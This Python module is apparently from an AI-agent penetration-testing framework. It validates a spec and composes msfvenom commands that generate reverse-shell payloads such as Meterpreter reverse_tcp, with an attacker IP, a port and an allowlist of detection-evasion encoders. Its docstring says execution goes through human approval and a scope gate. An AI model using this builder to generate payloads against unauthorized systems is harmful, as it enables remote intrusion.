"""
core/payload_builder.py — compose a validated msfvenom command for the exploit phase.

OpenElia's exploit agent previously only *described* payloads in prose. This module
turns a structured spec into a single, shell-safe msfvenom command string plus the
metadata the caller needs to drop, track, and roll back the artifact.

Scope (deliberately minimal — see plan "Out of scope"): msfvenom's built-in encoders
and format selection only. No BOAZ-style loaders, ETW patching, or LLVM obfuscation.

Security model: every caller-supplied field is validated. String fields are rejected
if they contain shell metacharacters (mirrors pentester_recon._validate_nmap_args);
lhost must be an IP, lport an in-range port, iterations a small non-negative int. The
returned command is a token list joined with single spaces — it is executed via
PentesterOS.run_sterile_command (HITL + scope gate + rootless ephemeral container),
never through a shell here.
"""

from __future__ import annotations

import ipaddress
import re

# Reject anything that could break out of a single argument token. Same character
# class used by pentester_recon for nmap arg validation, kept local to avoid coupling.
_SHELL_META = re.compile(r"[;&|`$<>!\\(){}\[\]'\"\s]")

# Allowlisted output formats and encoders. Conservative on purpose — an unknown value
# is rejected rather than passed through to msfvenom.
_ALLOWED_FORMATS = frozenset(
    {"exe", "elf", "raw", "dll", "macho", "psh", "py", "c", "war", "asp", "jsp"}
)
_ALLOWED_ENCODERS = frozenset(
    {
        "x86/shikata_ga_nai",
        "x64/xor_dynamic",
        "x64/zutto_dekiru",
        "x86/call4_dword_xor",
        "cmd/powershell_base64",
    }
)

_MAX_ITERATIONS = 50


class PayloadSpecError(ValueError):
    """Raised when a payload spec fails validation."""


def _check_token(name: str, value: str) -> str:
    if not isinstance(value, str) or not value:
        raise PayloadSpecError(f"{name} must be a non-empty string")
    if _SHELL_META.search(value):
        raise PayloadSpecError(f"Disallowed character in {name}: {value!r}")
    return value


class PayloadBuilder:
    """Compose a validated msfvenom command from a payload spec."""

    @staticmethod
    def build(spec: dict) -> dict:
        """Validate ``spec`` and return a payload descriptor.

        spec keys:
            payload_type (str, required) e.g. "windows/x64/meterpreter/reverse_tcp"
            lhost (str, required)        attacker IP (validated as an IP address)
            lport (int, required)        1–65535
            format (str, required)       one of _ALLOWED_FORMATS
            encoder (str, optional)      one of _ALLOWED_ENCODERS
            iterations (int, optional)   encoder passes, 0–_MAX_ITERATIONS (default 1
                                         when an encoder is given, else 0)
            outfile (str, optional)      output filename (basename only; no path)

        Returns:
            {
              "command": "msfvenom -p ... -o <outfile>",  # shell-safe, space-joined
              "argv": [...],                                # token list
              "outfile": "<basename>",
              "payload_type": ..., "format": ..., "encoder": ... | None,
            }

        Raises PayloadSpecError on any invalid field.
        """
        if not isinstance(spec, dict):
            raise PayloadSpecError("spec must be a dict")

        payload_type = _check_token("payload_type", spec.get("payload_type", ""))

        lhost = spec.get("lhost", "")
        try:
            ipaddress.ip_address(lhost)
        except ValueError as exc:
            raise PayloadSpecError(f"lhost must be a valid IP address: {lhost!r}") from exc

        lport = spec.get("lport")
        if not isinstance(lport, int) or isinstance(lport, bool) or not (1 <= lport <= 65535):
            raise PayloadSpecError(f"lport must be an int in 1..65535: {lport!r}")

        fmt = spec.get("format", "")
        if fmt not in _ALLOWED_FORMATS:
            raise PayloadSpecError(
                f"format {fmt!r} not allowed (allowed: {sorted(_ALLOWED_FORMATS)})"
            )

        encoder = spec.get("encoder")
        if encoder is not None and encoder not in _ALLOWED_ENCODERS:
            raise PayloadSpecError(
                f"encoder {encoder!r} not allowed (allowed: {sorted(_ALLOWED_ENCODERS)})"
            )

        iterations = spec.get("iterations")
        if iterations is None:
            iterations = 1 if encoder else 0
        if not isinstance(iterations, int) or isinstance(iterations, bool) or not (
            0 <= iterations <= _MAX_ITERATIONS
        ):
            raise PayloadSpecError(
                f"iterations must be an int in 0..{_MAX_ITERATIONS}: {iterations!r}"
            )

        # Output filename: basename only, validated. Default keyed to the format.
        outfile_raw = spec.get("outfile") or f"payload.{fmt}"
        # Reject path separators outright before the metachar check for a clearer error.
        if "/" in outfile_raw or "\\" in outfile_raw:
            raise PayloadSpecError(f"outfile must be a basename, no path: {outfile_raw!r}")
        outfile = _check_token("outfile", outfile_raw)

        argv = [
            "msfvenom",
            "-p", payload_type,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
        ]
        if encoder:
            argv += ["-e", encoder, "-i", str(iterations)]
        argv += ["-o", outfile]

        return {
            "command": " ".join(argv),
            "argv": argv,
            "outfile": outfile,
            "payload_type": payload_type,
            "format": fmt,
            "encoder": encoder,
            "iterations": iterations,
        }
